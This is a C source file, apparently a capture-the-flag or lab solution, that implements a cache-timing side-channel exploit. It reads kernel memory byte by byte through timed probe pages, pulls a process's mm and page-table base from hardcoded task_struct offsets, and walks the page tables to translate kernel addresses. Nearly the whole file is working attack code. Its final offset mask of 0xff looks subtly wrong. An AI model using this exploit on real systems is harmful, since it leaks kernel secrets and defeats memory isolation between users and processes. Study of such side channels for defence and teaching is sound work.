#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <semaphore.h>
#include <x86intrin.h>

#include "solve.h"

#define PHYSMEM_START 0xffff888000000000
#define MMAP_SIZE MAX * PAGE_SIZE

#define MM_OFFSET 0x3E0
#define PGD_OFFSET 0x50

#define FOR_EACH_BYTE(var)  FOR_EACH(var, 0, sizeof (addr_t))
#define FOR_EACH_VAL(var)   FOR_EACH(var, 0, MAX)

static struct page_data* page_ptr = NULL;

static void get_byte_timing_data(size_t hits[MAX])
{
    FOR_EACH_VAL(mix_j)
    {
        size_t time = measure(&page_ptr[mix_j]);
        if (time <= threshold)
            hits[mix_j] += 1;
    }
}

addr_t get_value_at_address(addr_t addr)
{
    addr_t ret = 0;
    FOR_EACH_BYTE(i)
    {
        size_t hits[MAX] = {0};
        perform_exploit(addr + i, hits, page_ptr, get_byte_timing_data);

        size_t most_hits = 0;
        byte_t byte = 0;
        FOR_EACH_VAL(j)
        {
            size_t hit = hits[j];
//            if (hit) printf("%2zu/%#2lx - hits: %ld\n", i, j, hit);
            if (hit && hit > most_hits) {
                most_hits = hit;
                byte = j;
            }
        }

//        printf("\n\n - %#x with hits of %zu - \n\n", byte, hits[byte]);
        ret += (addr_t) byte << (8 * i);
    }

    return ret;
}

addr_t get_mm(addr_t task_struct)
{
    addr_t mm_ptr = task_struct + MM_OFFSET;
    return get_value_at_address(mm_ptr);
}

addr_t get_pgd(addr_t mm)
{
    addr_t pgd_ptr = mm + PGD_OFFSET;
    return get_value_at_address(pgd_ptr);
}

addr_t get_kernel_address(addr_t task_struct, addr_t target)
{
    addr_t mm  = get_mm(task_struct);
    addr_t pgd = get_pgd(mm);

    printf("mm:  %p\n", mm);
    printf("pgd: %p\n", pgd);

    ssize_t offsets[4], addr = target >> 12;
    for (int i = 0; i < sizeof offsets / sizeof *offsets; i++) {
        offsets[i] = (addr >> (9 * i)) & 0x1ff;
    }
    
    size_t table = pgd;
    for (int i = 3; i >= 0; i--)
    {
		table  = get_value_at_address(((table & ~0xfff) + offsets[i] * 8));
		table &= ~((1<<12)-1) & ((1ull<<51) - 1);
		printf("table[%d] = %#p\n", i, table);
		table += PHYSMEM_START;
    }

    return table + (target & 0xff);
}

int allocate_mmap_mem(void)
{
    page_ptr = MMAP_MEM(MMAP_SIZE);
    if (page_ptr == MAP_FAILED)
        return -1;
    return 0;
}

void deallocate_mmap_mem(void)
{
    munmap(page_ptr, MMAP_SIZE);
}
